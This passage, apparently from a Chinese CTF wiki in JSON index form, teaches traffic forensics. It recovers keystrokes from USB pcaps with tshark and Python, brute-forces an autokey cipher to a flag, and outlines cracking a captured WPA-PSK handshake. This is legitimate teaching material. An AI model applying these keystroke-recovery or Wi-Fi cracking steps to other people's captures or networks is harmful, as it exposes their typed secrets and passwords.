\u5355\u72ec\u63d0\u53d6\u51fa\u6765\uff0c\u547d\u4ee4\u5982\u4e0b\uff1a</p> <pre><code>tshark -r example.pcap -T fields -e usb.capdata //\u5982\u679c\u60f3\u5bfc\u5165usbdata.txt\u6587\u4ef6\u4e2d\uff0c\u540e\u9762\u52a0\u4e0a\u53c2\u6570\uff1a&gt;usbdata.txt\n</code></pre> <p><code>Windows</code> \u4e0b\u88c5\u4e86 <code>wireshark</code> \u7684\u73af\u5883\u4e0b\uff0c\u5728 <code>wireshark</code>\u76ee\u5f55\u4e0b\u6709\u4e2a <code>tshark.exe</code> \uff0c\u6bd4\u5982\u6211\u7684\u5728 <code>D:\\Program Files\\Wireshark\\tshark.exe</code></p> <p></p> <p>\u8c03\u7528 <code>cmd</code> \uff0c\u5b9a\u4f4d\u5230\u5f53\u524d\u76ee\u5f55\u4e0b\uff0c\u8f93\u5165\u5982\u4e0b\u547d\u4ee4\u5373\u53ef\uff1a</p> <pre><code>tshark.exe -r example.pcap -T fields -e usb.capdata //\u5982\u679c\u60f3\u5bfc\u5165usbdata.txt\u6587\u4ef6\u4e2d\uff0c\u540e\u9762\u52a0\u4e0a\u53c2\u6570\uff1a&gt;usbdata.txt\n</code></pre> <p>\u6709\u5173 <code>tshark</code> \u547d\u4ee4\u7684\u8be6\u7ec6\u4f7f\u7528\u53c2\u8003 <code>wireshark</code> \u5b98\u65b9\u6587\u6863\uff1ahttps://www.wireshark.org/docs/man-pages/tshark.html</p> <p>\u8fd0\u884c\u547d\u4ee4\u5e76\u67e5\u770b <code>usbdata.txt</code> \u53d1\u73b0\u6570\u636e\u5305\u957f\u5ea6\u4e3a\u516b\u4e2a\u5b57\u8282</p> <p></p> <p>\u5173\u4e8e <code>USB</code> \u7684\u7279\u70b9\u5e94\u7528\u6211\u627e\u4e86\u4e00\u5f20\u56fe\uff0c\u5f88\u6e05\u695a\u7684\u53cd\u5e94\u4e86\u8fd9\u4e2a\u95ee\u9898\uff1a</p> <p></p> <p>\u8fd9\u91cc\u6211\u4eec\u53ea\u5173\u6ce8 <code>USB</code> \u6d41\u91cf\u4e2d\u7684\u952e\u76d8\u6d41\u91cf\u548c\u9f20\u6807\u6d41\u91cf\u3002</p> <p>\u952e\u76d8\u6570\u636e\u5305\u7684\u6570\u636e\u957f\u5ea6\u4e3a <code>8</code> \u4e2a\u5b57\u8282\uff0c\u51fb\u952e\u4fe1\u606f\u96c6\u4e2d\u5728\u7b2c <code>3</code> \u4e2a\u5b57\u8282\uff0c\u6bcf\u6b21 <code>key stroke</code> \u90fd\u4f1a\u4ea7\u751f\u4e00\u4e2a <code>keyboard event usb packet</code> \u3002</p> <p>\u9f20\u6807\u6570\u636e\u5305\u7684\u6570\u636e\u957f\u5ea6\u4e3a <code>4</code> \u4e2a\u5b57\u8282\uff0c\u7b2c\u4e00\u4e2a\u5b57\u8282\u4ee3\u8868\u6309\u952e\uff0c\u5f53\u53d6 <code>0x00</code> \u65f6\uff0c\u4ee3\u8868\u6ca1\u6709\u6309\u952e\u3001\u4e3a0x01\u65f6\uff0c\u4ee3\u8868\u6309\u5de6\u952e\uff0c\u4e3a <code>0x02</code> \u65f6\uff0c\u4ee3\u8868\u5f53\u524d\u6309\u952e\u4e3a\u53f3\u952e\u3002\u7b2c\u4e8c\u4e2a\u5b57\u8282\u53ef\u4ee5\u770b\u6210\u662f\u4e00\u4e2a <code>signed byte</code> \u7c7b\u578b\uff0c\u5176\u6700\u9ad8\u4f4d\u4e3a\u7b26\u53f7\u4f4d\uff0c\u5f53\u8fd9\u4e2a\u503c\u4e3a\u6b63\u65f6\uff0c\u4ee3\u8868\u9f20\u6807\u6c34\u5e73\u53f3\u79fb\u591a\u5c11\u50cf\u7d20\uff0c\u4e3a\u8d1f\u65f6\uff0c\u4ee3\u8868\u6c34\u5e73\u5de6\u79fb\u591a\u5c11\u50cf\u7d20\u3002\u7b2c\u4e09\u4e2a\u5b57\u8282\u4e0e\u7b2c\u4e8c\u5b57\u8282\u7c7b\u4f3c\uff0c\u4ee3\u8868\u5782\u76f4\u4e0a\u4e0b\u79fb\u52a8\u7684\u504f\u79fb\u3002</p> <p>\u6211\u7ffb\u9605\u4e86\u5927\u91cf\u7684 <code>USB</code> \u534f\u8bae\u7684\u6587\u6863\uff0c\u5728\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u627e\u5230\u8fd9\u4e2a\u503c\u4e0e\u5177\u4f53\u952e\u4f4d\u7684\u5bf9\u5e94\u5173\u7cfb\uff1ahttps://www.usb.org/sites/default/files/documents/hut1_12v2.pdf</p> <p><code>usb keyboard</code> \u7684\u6620\u5c04\u8868 \u6839\u636e\u8fd9\u4e2a\u6620\u5c04\u8868\u5c06\u7b2c\u4e09\u4e2a\u5b57\u8282\u53d6\u51fa\u6765\uff0c\u5bf9\u5e94\u5bf9\u7167\u8868\u5f97\u5230\u89e3\u7801\uff1a</p> <p></p> <p>\u6211\u4eec\u5199\u51fa\u5982\u4e0b\u811a\u672c\uff1a</p> <pre><code>mappings = { 0x04:\"A\",  0x05:\"B\",  0x06:\"C\", 0x07:\"D\", 0x08:\"E\", 0x09:\"F\", 0x0A:\"G\",  0x0B:\"H\", 0x0C:\"I\",  0x0D:\"J\", 0x0E:\"K\", 0x0F:\"L\", 0x10:\"M\", 0x11:\"N\",0x12:\"O\",  0x13:\"P\", 0x14:\"Q\", 0x15:\"R\", 0x16:\"S\", 0x17:\"T\", 0x18:\"U\",0x19:\"V\", 0x1A:\"W\", 0x1B:\"X\", 0x1C:\"Y\", 0x1D:\"Z\", 0x1E:\"1\", 0x1F:\"2\", 0x20:\"3\", 0x21:\"4\", 0x22:\"5\",  0x23:\"6\", 0x24:\"7\", 0x25:\"8\", 0x26:\"9\", 0x27:\"0\", 0x28:\"n\", 0x2a:\"[DEL]\",  0X2B:\"    \", 0x2C:\" \",  0x2D:\"-\", 0x2E:\"=\", 0x2F:\"[\",  0x30:\"]\",  0x31:\"\\\\\", 0x32:\"~\", 0x33:\";\",  0x34:\"'\", 0x36:\",\",  0x37:\".\" }\nnums = []\nkeys = open('usbdata.txt')\nfor line in keys:\n    if line[0]!='0' or line[1]!='0' or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0':\n         continue\n    nums.append(int(line[6:8],16))\n    # 00:00:xx:....\nkeys.close()\noutput = \"\"\nfor n in nums:\n    if n == 0 :\n        continue\n    if n in mappings:\n        output += mappings[n]\n    else:\n        output += '[unknown]'\nprint('output :n' + output)\n</code></pre> <p>\u7ed3\u679c\u5982\u4e0b\uff1a</p> <p></p> <p>\u6211\u4eec\u628a\u524d\u9762\u7684\u6574\u5408\u6210\u811a\u672c\uff0c\u5f97\uff1a</p> <pre><code>#!/usr/bin/env python\n\nimport sys\nimport os\n\nDataFileName = \"usb.dat\"\n\npresses = []\n\nnormalKeys = {\"04\":\"a\", \"05\":\"b\", \"06\":\"c\", \"07\":\"d\", \"08\":\"e\", \"09\":\"f\", \"0a\":\"g\", \"0b\":\"h\", \"0c\":\"i\", \"0d\":\"j\", \"0e\":\"k\", \"0f\":\"l\", \"10\":\"m\", \"11\":\"n\", \"12\":\"o\", \"13\":\"p\", \"14\":\"q\", \"15\":\"r\", \"16\":\"s\", \"17\":\"t\", \"18\":\"u\", \"19\":\"v\", \"1a\":\"w\", \"1b\":\"x\", \"1c\":\"y\", \"1d\":\"z\",\"1e\":\"1\", \"1f\":\"2\", \"20\":\"3\", \"21\":\"4\", \"22\":\"5\", \"23\":\"6\",\"24\":\"7\",\"25\":\"8\",\"26\":\"9\",\"27\":\"0\",\"28\":\"&lt;RET&gt;\",\"29\":\"&lt;ESC&gt;\",\"2a\":\"&lt;DEL&gt;\", \"2b\":\"\\t\",\"2c\":\"&lt;SPACE&gt;\",\"2d\":\"-\",\"2e\":\"=\",\"2f\":\"[\",\"30\":\"]\",\"31\":\"\\\\\",\"32\":\"&lt;NON&gt;\",\"33\":\";\",\"34\":\"'\",\"35\":\"&lt;GA&gt;\",\"36\":\",\",\"37\":\".\",\"38\":\"/\",\"39\":\"&lt;CAP&gt;\",\"3a\":\"&lt;F1&gt;\",\"3b\":\"&lt;F2&gt;\", \"3c\":\"&lt;F3&gt;\",\"3d\":\"&lt;F4&gt;\",\"3e\":\"&lt;F5&gt;\",\"3f\":\"&lt;F6&gt;\",\"40\":\"&lt;F7&gt;\",\"41\":\"&lt;F8&gt;\",\"42\":\"&lt;F9&gt;\",\"43\":\"&lt;F10&gt;\",\"44\":\"&lt;F11&gt;\",\"45\":\"&lt;F12&gt;\"}\n\nshiftKeys = {\"04\":\"A\", \"05\":\"B\", \"06\":\"C\", \"07\":\"D\", \"08\":\"E\", \"09\":\"F\", \"0a\":\"G\", \"0b\":\"H\", \"0c\":\"I\", \"0d\":\"J\", \"0e\":\"K\", \"0f\":\"L\", \"10\":\"M\", \"11\":\"N\", \"12\":\"O\", \"13\":\"P\", \"14\":\"Q\", \"15\":\"R\", \"16\":\"S\", \"17\":\"T\", \"18\":\"U\", \"19\":\"V\", \"1a\":\"W\", \"1b\":\"X\", \"1c\":\"Y\", \"1d\":\"Z\",\"1e\":\"!\", \"1f\":\"@\", \"20\":\"#\", \"21\":\"$\", \"22\":\"%\", \"23\":\"^\",\"24\":\"&amp;\",\"25\":\"*\",\"26\":\"(\",\"27\":\")\",\"28\":\"&lt;RET&gt;\",\"29\":\"&lt;ESC&gt;\",\"2a\":\"&lt;DEL&gt;\", \"2b\":\"\\t\",\"2c\":\"&lt;SPACE&gt;\",\"2d\":\"_\",\"2e\":\"+\",\"2f\":\"{\",\"30\":\"}\",\"31\":\"|\",\"32\":\"&lt;NON&gt;\",\"33\":\"\\\"\",\"34\":\":\",\"35\":\"&lt;GA&gt;\",\"36\":\"&lt;\",\"37\":\"&gt;\",\"38\":\"?\",\"39\":\"&lt;CAP&gt;\",\"3a\":\"&lt;F1&gt;\",\"3b\":\"&lt;F2&gt;\", \"3c\":\"&lt;F3&gt;\",\"3d\":\"&lt;F4&gt;\",\"3e\":\"&lt;F5&gt;\",\"3f\":\"&lt;F6&gt;\",\"40\":\"&lt;F7&gt;\",\"41\":\"&lt;F8&gt;\",\"42\":\"&lt;F9&gt;\",\"43\":\"&lt;F10&gt;\",\"44\":\"&lt;F11&gt;\",\"45\":\"&lt;F12&gt;\"}\n\ndef main():\n    # check argv\n    if len(sys.argv) != 2:\n        print \"Usage : \"\n        print \"        python UsbKeyboardHacker.py data.pcap\"\n        print \"Tips : \"\n        print \"        To use this python script , you must install the tshark first.\"\n        print \"        You can use `sudo apt-get install tshark` to install it\"\n        print \"        Thank you for using.\"\n        exit(1)\n\n    # get argv\n    pcapFilePath = sys.argv[1]\n\n    # get data of pcap\n    os.system(\"tshark -r %s -T fields -e usb.capdata &gt; %s\" % (pcapFilePath, DataFileName))\n\n    # read data\n    with open(DataFileName, \"r\") as f:\n        for line in f:\n            presses.append(line[0:-1])\n    # handle\n    result = \"\"\n    for press in presses:\n        Bytes = press.split(\":\")\n        if Bytes[0] == \"00\":\n            if Bytes[2] != \"00\":\n                result += normalKeys[Bytes[2]]\n        elif Bytes[0] == \"20\": # shift key is pressed.\n            if Bytes[2] != \"00\":\n                result += shiftKeys[Bytes[2]]\n        else:\n            print \"[-] Unknow Key : %s\" % (Bytes[0])\n    print \"[+] Found : %s\" % (result)\n\n    # clean the temp data\n    os.system(\"rm ./%s\" % (DataFileName))\n\n\nif __name__ == \"__main__\":\n    main()\n</code></pre> <p>\u6548\u679c\u5982\u4e0b\uff1a</p> <p></p> <p>\u53e6\u5916\u8d34\u4e0a\u4e00\u4efd\u9f20\u6807\u6d41\u91cf\u6570\u636e\u5305\u8f6c\u6362\u811a\u672c\uff1a</p> <pre><code>nums = [] \nkeys = open('usbdata.txt','r') \nposx = 0 \nposy = 0 \nfor line in keys: \nif len(line) != 12 : \n     continue \nx = int(line[3:5],16) \ny = int(line[6:8],16) \nif x &gt; 127 : \n    x -= 256 \nif y &gt; 127 : \n    y -= 256 \nposx += x \nposy += y \nbtn_flag = int(line[0:2],16)  # 1 for left , 2 for right , 0 for nothing \nif btn_flag == 1 : \n    print posx , posy \nkeys.close()\n</code></pre> <p>\u952e\u76d8\u6d41\u91cf\u6570\u636e\u5305\u8f6c\u6362\u811a\u672c\u5982\u4e0b\uff1a</p> <pre><code>nums=[0x66,0x30,0x39,0x65,0x35,0x34,0x63,0x31,0x62,0x61,0x64,0x32,0x78,0x33,0x38,0x6d,0x76,0x79,0x67,0x37,0x77,0x7a,0x6c,0x73,0x75,0x68,0x6b,0x69,0x6a,0x6e,0x6f,0x70]\ns=''\nfor x in nums:\n    s+=chr(x)\nprint s\nmappings = { 0x41:\"A\",  0x42:\"B\",  0x43:\"C\", 0x44:\"D\", 0x45:\"E\", 0x46:\"F\", 0x47:\"G\",  0x48:\"H\", 0x49:\"I\",  0x4a:\"J\", 0x4b:\"K\", 0x4c:\"L\", 0x4d:\"M\", 0x4e:\"N\",0x4f:\"O\",  0x50:\"P\", 0x51:\"Q\", 0x52:\"R\", 0x53:\"S\", 0x54:\"T\", 0x55:\"U\",0x56:\"V\", 0x57:\"W\", 0x58:\"X\", 0x59:\"Y\", 0x5a:\"Z\", 0x60:\"0\", 0x61:\"1\", 0x62:\"2\", 0x63:\"3\", 0x64:\"4\",  0x65:\"5\", 0x66:\"6\", 0x67:\"7\", 0x68:\"8\", 0x69:\"9\", 0x6a:\"*\", 0x6b:\"+\",  0X6c:\"separator\", 0x6d:\"-\",  0x6e:\".\", 0x6f:\"/\" }\noutput = \"\"\nfor n in nums:\n    if n == 0 :\n        continue\n    if n in mappings:\n        output += mappings[n]\n    else:\n        output += '[unknown]'\nprint 'output :\\n' + output\n</code></pre> <p>\u90a3\u4e48\u5bf9\u4e8e <code>xman</code> \u4e09\u671f\u590f\u4ee4\u8425\u6392\u4f4d\u8d5b\u7684\u8fd9\u9053\u9898\uff0c\u6211\u4eec\u53ef\u4ee5\u6a21\u4eff\u5c1d\u8bd5\u5982\u4e0a\u8fd9\u4e2a\u4f8b\u5b50\uff1a</p> <p>\u9996\u5148\u6211\u4eec\u901a\u8fc7 <code>tshark</code> \u5c06 <code>usb.capdata</code> \u5168\u90e8\u5bfc\u51fa\uff1a</p> <pre><code>tshark -r task_AutoKey.pcapng -T fields -e usb.capdata //\u5982\u679c\u60f3\u5bfc\u5165usbdata.txt\u6587\u4ef6\u4e2d\uff0c\u540e\u9762\u52a0\u4e0a\u53c2\u6570\uff1a&gt;usbdata.txt\n</code></pre> <p>\u7ed3\u679c\u5982\u4e0b\uff1a</p> <p></p> <p>\u6211\u4eec\u7528\u4e0a\u9762\u7684 <code>python</code> \u811a\u672c\u5c06\u7b2c\u4e09\u4e2a\u5b57\u8282\u53d6\u51fa\u6765\uff0c\u5bf9\u5e94\u5bf9\u7167\u8868\u5f97\u5230\u89e3\u7801\uff1a</p> <pre><code>mappings = { 0x04:\"A\",  0x05:\"B\",  0x06:\"C\", 0x07:\"D\", 0x08:\"E\", 0x09:\"F\", 0x0A:\"G\",  0x0B:\"H\", 0x0C:\"I\",  0x0D:\"J\", 0x0E:\"K\", 0x0F:\"L\", 0x10:\"M\", 0x11:\"N\",0x12:\"O\",  0x13:\"P\", 0x14:\"Q\", 0x15:\"R\", 0x16:\"S\", 0x17:\"T\", 0x18:\"U\",0x19:\"V\", 0x1A:\"W\", 0x1B:\"X\", 0x1C:\"Y\", 0x1D:\"Z\", 0x1E:\"1\", 0x1F:\"2\", 0x20:\"3\", 0x21:\"4\", 0x22:\"5\",  0x23:\"6\", 0x24:\"7\", 0x25:\"8\", 0x26:\"9\", 0x27:\"0\", 0x28:\"n\", 0x2a:\"[DEL]\",  0X2B:\"    \", 0x2C:\" \",  0x2D:\"-\", 0x2E:\"=\", 0x2F:\"[\",  0x30:\"]\",  0x31:\"\\\\\", 0x32:\"~\", 0x33:\";\",  0x34:\"'\", 0x36:\",\",  0x37:\".\" }\nnums = []\nkeys = open('usbdata.txt')\nfor line in keys:\n    if line[0]!='0' or line[1]!='0' or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0':\n         continue\n    nums.append(int(line[6:8],16))\n    # 00:00:xx:....\nkeys.close()\noutput = \"\"\nfor n in nums:\n    if n == 0 :\n        continue\n    if n in mappings:\n        output += mappings[n]\n    else:\n        output += '[unknown]'\nprint('output :n' + output)\n</code></pre> <p>\u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\uff1a</p> <p></p> <pre><code>output :n[unknown]A[unknown]UTOKEY''.DECIPHER'[unknown]MPLRVFFCZEYOUJFJKYBXGZVDGQAURKXZOLKOLVTUFBLRNJESQITWAHXNSIJXPNMPLSHCJBTYHZEALOGVIAAISSPLFHLFSWFEHJNCRWHTINSMAMBVEXO[DEL]PZE[DEL]IZ'\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u8fd9\u662f\u81ea\u52a8\u5bc6\u5319\u89e3\u7801\uff0c\u73b0\u5728\u7684\u95ee\u9898\u662f\u5728\u6211\u4eec\u4e0d\u77e5\u9053\u5bc6\u94a5\u7684\u60c5\u51b5\u4e0b\u5e94\u8be5\u5982\u4f55\u89e3\u7801\u5462\uff1f</p> <p>\u6211\u627e\u5230\u4e86\u5982\u4e0b\u8fd9\u7bc7\u5173\u4e8e\u5982\u4f55\u7206\u7834\u5bc6\u5319\uff1ahttp://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/</p> <p>\u7206\u7834\u811a\u672c\u5982\u4e0b\uff1a</p> <pre><code>from ngram_score import ngram_score\nfrom pycipher import Autokey\nimport re\nfrom itertools import permutations\n\nqgram = ngram_score('quadgrams.txt')\ntrigram = ngram_score('trigrams.txt')\n\nctext = 'MPLRVFFCZEYOUJFJKYBXGZVDGQAURKXZOLKOLVTUFBLRNJESQITWAHXNSIJXPNMPLSHCJBTYHZEALOGVIAAISSPLFHLFSWFEHJNCRWHTINSMAMBVEXPZIZ'\n\nctext = re.sub(r'[^A-Z]','',ctext.upper())\n# keep a list of the N best things we have seen, discard anything else\n\nclass nbest(object):\n    def __init__(self,N=1000):\n        self.store = []\n        self.N = N\n\n    def add(self,item):\n        self.store.append(item)\n        self.store.sort(reverse=True)\n        self.store = self.store[:self.N]\n\n    def __getitem__(self,k):\n        return self.store[k]\n\n    def __len__(self):\n        return len(self.store)\n\n#init\nN=100\nfor KLEN in range(3,20):\n    rec = nbest(N)\n    for i in permutations('ABCDEFGHIJKLMNOPQRSTUVWXYZ',3):\n        key = ''.join(i) + 'A'*(KLEN-len(i))\n        pt = Autokey(key).decipher(ctext)\n        score = 0\n        for j in range(0,len(ctext),KLEN):\n            score += trigram.score(pt[j:j+3])\n        rec.add((score,''.join(i),pt[:30]))\n\n    next_rec = nbest(N)\n    for i in range(0,KLEN-3):\n        for k in xrange(N):\n            for c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':\n                key = rec[k][1] + c\n                fullkey = key + 'A'*(KLEN-len(key))\n                pt = Autokey(fullkey).decipher(ctext)\n                score = 0\n                for j in range(0,len(ctext),KLEN):\n                    score += qgram.score(pt[j:j+len(key)])\n                next_rec.add((score,key,pt[:30]))\n        rec = next_rec\n        next_rec = nbest(N)\n    bestkey = rec[0][1]\n    pt = Autokey(bestkey).decipher(ctext)\n    bestscore = qgram.score(pt)\n    for i in range(N):\n        pt = Autokey(rec[i][1]).decipher(ctext)\n        score = qgram.score(pt)\n        if score &gt; bestscore:\n            bestkey = rec[i][1]\n            bestscore = score       \n    print bestscore,'autokey, klen',KLEN,':\"'+bestkey+'\",',Autokey(bestkey).decipher(ctext)\n</code></pre> <p>\u8dd1\u51fa\u6765\u7684\u7ed3\u679c\u5982\u4e0b\uff1a</p> <p></p> <p>\u6211\u4eec\u770b\u5230\u4e86 <code>flag</code> \u7684\u5b57\u6837\uff0c\u6574\u7406\u53ef\u5f97\u5982\u4e0b\uff1a</p> <pre><code>-674.914569565 autokey, klen 8 :\"FLAGHERE\", HELLOBOYSANDGIRLSYOUARESOSMARTTHATYOUCANFINDTHEFLAGTHATIHIDEINTHEKEYBOARDPACKAGEFLAGISJHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF\n</code></pre> <p>\u6211\u4eec\u628a\u5b57\u6bb5\u8fdb\u884c\u5206\u5272\u770b\uff1a</p> <pre><code>HELLO\nBOYS\nAND\nGIRLS\nYOU\nARE\nSO\nSMART\nTHAT\nYOU\nCAN\nFIND\nTHE\nFLAG\nTHAT\nIH\nIDE\nIN\nTHE\nKEY\nBOARD\nPACKAGE\nFLAG\nIS\nJHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF\n</code></pre> <p>\u6700\u540e\u7684 <code>flag</code> \u5c31\u662f <code>flag{JHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF}</code> </p>"},{"location":"misc/traffic/protocols/usb/#_4","title":"\u53c2\u8003\u6587\u732e","text":"<ul> <li>https://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html</li> <li>https://blog.csdn.net/songze_lee/article/details/77658094</li> <li>https://wiki.wireshark.org/USB</li> <li>https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf</li> <li>https://www.wireshark.org/docs/man-pages/tshark.html</li> <li>http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/</li> <li>https://hackfun.org/2017/02/22/CTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80%E7%9A%84%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86/</li> </ul>"},{"location":"misc/traffic/protocols/wifi/","title":"WIFI","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p><code>802.11</code> \u662f\u73b0\u4eca\u65e0\u7ebf\u5c40\u57df\u7f51\u901a\u7528\u7684\u6807\u51c6,\u5e38\u89c1\u8ba4\u8bc1\u65b9\u5f0f</p> <ul> <li>\u4e0d\u542f\u7528\u5b89\u5168\u200d\u200d</li> <li><code>WEP\u200d\u200d</code></li> <li><code>WPA/WPA2-PSK</code>\uff08\u9884\u5171\u4eab\u5bc6\u94a5\uff09\u200d\u200d</li> <li><code>PA/WPA2 802.1X</code> \uff08<code>radius</code> \u8ba4\u8bc1\uff09</li> </ul>"},{"location":"misc/traffic/protocols/wifi/#wpa-psk","title":"WPA-PSK","text":"<p>\u8ba4\u8bc1\u5927\u81f4\u8fc7\u7a0b\u5982\u4e0b\u56fe</p> <p></p> <p>\u5176\u4e2d\u56db\u6b21\u63e1\u624b\u8fc7\u7a0b</p> <p></p> <ol> <li>4\u6b21\u63e1\u624b\u5f00\u59cb\u4e8e\u9a8c\u8bc1\u5668(AP)\uff0c\u5b83\u4ea7\u751f\u4e00\u4e2a\u968f\u673a\u7684\u503c(ANonce)\u53d1\u9001\u7ed9\u8bf7\u6c42\u8005</li> <li>\u8bf7\u6c42\u8005\u4e5f\u4ea7\u751f\u4e86\u5b83\u81ea\u5df1\u7684\u968f\u673aSNonce\uff0c\u7136\u540e\u7528\u8fd9\u4e24\u4e2aNonces\u4ee5\u53caPMK\u751f\u6210\u4e86PTK\u3002\u8bf7\u6c42\u8005\u56de\u590d\u6d88\u606f2\u7ed9\u9a8c\u8bc1\u5668,\u8fd8\u6709\u4e00\u4e2aMIC\uff08message integrity code\uff0c\u6d88\u606f\u9a8c\u8bc1\u7801\uff09\u4f5c\u4e3aPMK\u7684\u9a8c\u8bc1</li> <li>\u5b83\u5148\u8981\u9a8c\u8bc1\u8bf7\u6c42\u8005\u5728\u6d88\u606f2\u4e2d\u53d1\u6765\u7684MIC\u7b49\u4fe1\u606f\uff0c\u9a8c\u8bc1\u6210\u529f\u540e\uff0c\u5982\u679c\u9700\u8981\u5c31\u751f\u6210GTK\u3002\u7136\u540e\u53d1\u9001\u6d88\u606f3</li> <li>\u8bf7\u6c42\u8005\u6536\u5230\u6d88\u606f3\uff0c\u9a8c\u8bc1MIC\uff0c\u5b89\u88c5\u5bc6\u94a5\uff0c\u53d1\u9001\u6d88\u606f4\uff0c\u4e00\u4e2a\u786e\u8ba4\u4fe1\u606f\u3002\u9a8c\u8bc1\u5668\u6536\u5230\u6d88\u606f4\uff0c\u9a8c\u8bc1MIC\uff0c\u5b89\u88c5\u76f8\u540c\u7684\u5bc6\u94a5</li> </ol>"},{"location":"misc/traffic/protocols/wifi/#_1","title":"\u4f8b\u9898","text":"<p>\u5b9e\u9a8c\u5427\uff1a <code>shipin.cap</code></p> <p>\u4ece\u5927\u91cf\u7684<code>Deauth</code> \u653b\u51fb\u57fa\u672c\u53ef\u4ee5\u5224\u65ad\u662f\u4e00\u4e2a\u7834\u89e3 <code>wifi</code> \u65f6\u7684\u6d41\u91cf\u653b\u51fb</p> <p>\u540c\u65f6\u4e5f\u6210\u529f\u53d1\u73b0\u4e86\u63e1\u624b\u5305\u4fe1\u606f</p> <p></p> <p>\u63a5\u4e0b\u6765\u8dd1\u5bc6\u7801</p> <ul> <li><code>linux</code> \uff1a <code>aircrack</code> \u5957\u4ef6</li> <li><code>windows</code> \uff1a <code>wifipr</code> \uff0c\u901f\u5ea6\u6bd4 <code>esaw</code> \u5feb\uff0c <code>GTX850</code> \u80fd\u5c06\u8fd1 <code>10w\\s  :</code>)</li> </ul> <p>\u5f97\u5230\u5bc6\u7801<code>88888888</code>\u5728 <code>wireshark</code> \u4e2d<code>Edit -&gt; Preferences -&gt; Protocols -&gt; IEEE802.11 -&gt; Edit</code>\u4ee5<code>key:SSID</code>\u5f62\u5f0f\u586b\u5165\u5373\u53ef\u89e3\u5bc6 <code>wifi</code> \u5305\u770b\u5230\u660e\u6587\u6d41\u91cf</p> <p>KCARCK\u76f8\u5173: https://www.krackattacks.com/</p>"},{"location":"misc/traffic/protocols/wifi/#_2","title":"\u53c2\u8003\u6587\u732e","text":"<ul> <li>http://www.freebuf.com/articles/wireless/58342.html</li> <li>http://blog.csdn.net/keekjkj/article/details/46753883</li> </ul>"},{"location":"misc/traffic/protocols/wireshark/","title":"Wireshark","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"misc/traffic/protocols/wireshark/#wireshark_1","title":"Wireshark \u5e38\u7528\u529f\u80fd\u4ecb\u7ecd","text":""},{"location":"misc/traffic/protocols/wireshark/#_1","title":"\u663e\u793a\u8fc7\u6ee4\u5668","text":"<p>\u663e\u793a\u8fc7\u6ee4\u5668\u53ef\u4ee5\u7528\u5f88\u591a\u4e0d\u540c\u7684\u53c2\u6570\u6765\u4f5c\u4e3a\u5339\u914d\u6807\u51c6\uff0c\u6bd4\u5982IP\u5730\u5740\u3001\u534f\u8bae\u3001\u7aef\u53e3\u53f7\u3001\u67d0\u4e9b\u534f\u8bae\u5934\u90e8\u7684\u53c2\u6570\u3002\u6b64\u5916\uff0c\u7528\u6237\u4e5f\u7528\u4e00\u4e9b\u6761\u4ef6\u5de5\u5177\u548c\u4e32\u8054\u8fd0\u7b97\u7b26\u521b\u5efa\u51fa\u66f4\u52a0\u590d\u6742\u7684\u8868\u8fbe\u5f0f\u3002\u7528\u6237\u53ef\u4ee5\u5c06\u4e0d\u540c\u7684\u8868\u8fbe\u5f0f\u7ec4\u5408\u8d77\u6765\uff0c\u8ba9\u8f6f\u4ef6\u663e\u793a\u7684\u6570\u636e\u5305\u8303\u56f4\u66f4\u52a0\u7cbe\u786e\u3002\u5728\u6570\u636e\u5305\u5217\u8868\u9762\u677f\u4e2d\u663e\u793a\u7684\u6240\u6709\u6570\u636e\u5305\u90fd\u53ef\u4ee5\u7528\u6570\u636e\u5305\u4e2d\u5305\u542b\u7684\u5b57\u6bb5\u8fdb\u884c\u8fc7\u6ee4\u3002</p> <pre><code>[not] Expression [and|or] [not] Expression\n</code></pre> <p>\u7ecf\u5e38\u8981\u7528\u5230\u5404\u79cd\u8fd0\u7b97\u7b26</p> \u8fd0\u7b97\u7b26 \u8bf4\u660e == \u7b49\u4e8e != \u4e0d\u7b49\u4e8e &gt; \u5927\u4e8e &lt; \u5c0f\u4e8e &gt;= \u5927\u4e8e\u7b49\u4e8e &lt;= \u5c0f\u4e8e\u7b49\u4e8e \u4e0e and , &amp;&amp; \u6216 or , || \u975e ! , not"},{"location":"misc/traffic/protocols/wireshark/#_2","title":"\u914d\u7f6e\u65b9\u6cd5","text":"<ol> <li>\u501f\u52a9\u4e8e\u8fc7\u6ee4\u5668\u7a97\u53e3</li> </ol> <ol> <li>\u501f\u52a9\u4e8e\u5de5\u5177\u6761\u7684\u8f93\u5165\u680f</li> </ol> <ol> <li>\u5c06\u6570\u636e\u5305\u67d0\u4e2a\u5c5e\u6027\u503c\u6307\u5b9a\u4e3a\u8fc7\u6ee4\u6761\u4ef6</li> </ol> <p>Note</p> <p>\u200b    \u590d\u6742\u7684\u8fc7\u6ee4\u547d\u4ee4\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u7b2c\u4e09\u79cd\u65b9\u5f0f\u5f97\u5230\u8fc7\u6ee4\u8bed\u6cd5</p>"},{"location":"misc/traffic/protocols/wireshark/#_3","title":"\u4fe1\u606f\u7edf\u8ba1","text":""},{"location":"misc/traffic/protocols/wireshark/#protocol-history","title":"Protocol 